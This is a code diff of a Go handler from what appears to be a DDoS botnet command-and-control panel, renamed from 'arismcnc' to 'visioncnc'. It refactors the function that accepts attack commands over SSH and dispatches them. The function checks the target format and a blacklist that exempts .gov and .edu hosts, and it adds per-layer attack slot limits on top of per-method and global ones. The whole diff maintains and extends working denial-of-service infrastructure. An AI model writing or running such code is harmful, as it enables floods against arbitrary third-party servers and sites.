@@ -1,26 +1,17 @@
 package handlers
 
 import (
-	"arismcnc/database"
-	"arismcnc/managers"
-	"arismcnc/utils"
 	"fmt"
-	"log"
-	"os"
 	"strconv"
-	"strings"
+	"visioncnc/database"
+	"visioncnc/managers"
+	"visioncnc/utils"
 
 	"github.com/gliderlabs/ssh"
 )
 
 // AttackHandler validates and dispatches attack commands
-func AttackHandler(db *database.Database, session ssh.Session, args []string) {
-	config, err := utils.LoadConfig("assets/config.json")
-	if err != nil {
-		log.Printf("failed to load config: %v", err)
-		return
-	}
-
+func AttackHandler(db *database.Database, session ssh.Session, args []string, config *utils.Config) {
 	userInfo := db.GetAccountInfo(session.User())
 	methods := utils.GetMethodsList()
 
@@ -52,22 +43,25 @@ func AttackHandler(db *database.Database, session ssh.Session, args []string) {
 	}
 
 	// Validate target format
-	if len(args) > 1 && !isValidTarget(args[1]) {
+	if len(args) > 1 && !utils.IsValidTarget(args[1]) {
 		msg := utils.Branding(session, "invalid-usage", brandingData)
 		utils.SendMessage(session, msg, true)
 		return
 	}
 
 	// Blacklist check
-	if isBlacklisted(db, session, args) {
-		lm, err := managers.NewLogManager("./assets/logs/logs.json")
-		if err != nil {
-			log.Printf("Error initializing LogManager: %v", err)
-			return
+	if isBlacklisted(args[1]) {
+		lm := managers.GetSharedLogManager()
+		if lm != nil {
+			lm.LogEvent("blacklist_blocked", map[string]string{
+				"source":   "C2",
+				"username": session.User(),
+				"target":   args[1],
+				"port":     args[2],
+				"time":     args[3],
+				"method":   args[0],
+			})
 		}
-		defer lm.Close()
-
-		lm.Log("User tried to attack blocked target (C2)!\nUsername: " + session.User() + "\nTarget: " + args[1] + "\nPort: " + args[2] + "\nTime: " + args[3] + "\nMethod: " + args[0] + "\n----------------------")
 		msg := utils.Branding(session, "blocked-target", brandingData)
 		utils.SendMessage(session, msg, true)
 		return
@@ -80,7 +74,7 @@ func AttackHandler(db *database.Database, session ssh.Session, args []string) {
 		return
 	}
 
-	// Slot validation
+	// Slot validation (global + method + layer)
 	if !validateSlots(db, session, config, args[0], userInfo) {
 		return
 	}
@@ -107,12 +101,7 @@ func AttackHandler(db *database.Database, session ssh.Session, args []string) {
 	}
 
 	// Build and execute attack
-	vip := userInfo.Vip == 1
-	private := userInfo.Private == 1
-	admin := userInfo.Admin == 1
-	maxtime := userInfo.Maxtime
-
-	atk, err := managers.NewAttack(session, args, vip, private, admin, maxtime, db)
+	atk, err := managers.NewAttack(session, args, userInfo.Vip == 1, userInfo.Private == 1, userInfo.Admin == 1, userInfo.Maxtime, db)
 	if err != nil {
 		session.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
 		return
@@ -128,23 +117,13 @@ func AttackHandler(db *database.Database, session ssh.Session, args []string) {
 	}
 }
 
-func isValidTarget(target string) bool {
-	return strings.HasPrefix(target, "http://") || strings.HasPrefix(target, "https://") || managers.ValidIP4(target)
-}
-
-func isBlacklisted(db *database.Database, session ssh.Session, args []string) bool {
+func isBlacklisted(target string) bool {
 	blockedIPS := utils.ReadBlacklistedIPs("assets/blacklists/list.json")
-	for _, blockedIP := range blockedIPS {
-		if args[1] == blockedIP || (strings.Contains(blockedIP, ".gov") && strings.Contains(args[1], ".gov")) || (strings.Contains(blockedIP, ".edu") && strings.Contains(args[1], ".edu")) {
-			return true
-		}
-	}
-	return false
+	return utils.IsTargetBlocked(target, blockedIPS)
 }
 
 func validateSlots(db *database.Database, session ssh.Session, config *utils.Config, method string, userInfo database.AccountInfo) bool {
 	theme := utils.GetTheme()
-	currentAttacks := db.GetCurrentAttacksLength()
 
 	methodConfig, err := utils.GetMethodConfig(method)
 	if err != nil {
@@ -152,15 +131,32 @@ func validateSlots(db *database.Database, session ssh.Session, config *utils.Con
 		return false
 	}
 
+	// Per-method slots
 	if db.GetCurrentAttacksLength2(methodConfig.Method) >= methodConfig.Slots {
 		utils.SendMessage(session, theme.Colors.Error+"All slots of method `"+methodConfig.Method+"` ("+strconv.Itoa(methodConfig.Slots)+") are currently in use!"+theme.Colors.Reset, true)
 		return false
 	}
 
-	if currentAttacks > config.Global_slots {
+	// Global slots
+	if db.GetCurrentAttacksLength() > config.Global_slots {
 		utils.SendMessage(session, theme.Colors.Error+"Global network slots ("+strconv.Itoa(config.Global_slots)+") are currently in use"+theme.Colors.Reset, true)
 		return false
 	}
+
+	// Per-layer slots
+	if limit, ok := config.Layer_slots[methodConfig.Group]; ok && limit > 0 {
+		if db.GetCurrentAttacksLengthByGroup(methodConfig.Group) >= limit {
+			brandingData := BuildBrandingData(session, db)
+			msg := utils.Branding(session, "layer-limit", brandingData)
+			if msg == "" {
+				utils.SendMessage(session, theme.Colors.Error+methodConfig.Group+" layer slots ("+strconv.Itoa(limit)+") are currently in use"+theme.Colors.Reset, true)
+			} else {
+				utils.SendMessage(session, msg, true)
+			}
+			return false
+		}
+	}
+
 	return true
 }
 
@@ -177,6 +173,3 @@ func checkCooldowns(db *database.Database, session ssh.Session, config *utils.Co
 	}
 	return true
 }
-
-// Ensure os import is used (for log manager)
-var _ = os.Exit
